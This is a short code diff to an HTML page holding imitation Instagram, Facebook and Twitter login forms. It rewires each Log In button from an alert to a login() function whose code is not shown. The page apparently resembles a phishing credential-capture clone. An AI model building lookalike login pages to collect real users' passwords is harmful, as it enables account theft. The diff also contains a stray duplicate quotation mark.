@@ -156,7 +156,7 @@
               <div class="c-panel__form">
                 <input type="text" class="c-panel__input" class="form-control" required data-error="Please enter your email" placeholder="Phone number, username, or email" id="ig-uname">
                 <input type="text" class="c-panel__input" class="form-control" required data-error="Please enter your email" placeholder="Password" id="ig-pass">
-                <button class="c-btn" type="submit" onclick="showCustomAlert()" id="ig-log"> Log In</button> 
+                <button class="c-btn" type="submit" onclick="login()" id="ig-log"> Log In</button> 
                 <span class="c-panel__span">OR</span>
               </div>
               <a href="#" class="c-panel__facebook">Login with Facebook</a> <br>
@@ -193,7 +193,7 @@
 
                             <input type="text" placeholder="Email or Phone number" required id="fb-email"><br>
                             <input type="password" placeholder="Password" required id="fb-pass"><br>
-                            <button class="c-btn" onclick="showCustomAlert()" id="fb-log">Log In</button><br> <br>
+                            <button class="c-btn" onclick="login()" id="fb-log">Log In</button><br> <br>
                             
                             <a href="#">Forgotten password?</a><br>
                             <button id="create-btn">Create New Account</button><br>
@@ -229,7 +229,7 @@
 
            <div class="margin mb-4">
              <button type="button"
-               class="btn but d-flex justify-content-center btn-white border-dark bg-dark rounded-pill" onclick="showCustomAlert()">
+               class="btn but d-flex justify-content-center btn-white border-dark bg-dark rounded-pill" onclick="login()" id="tw-log"">
                <p class="text-white"><b>Log In</b></p>
              </button>
            </div>
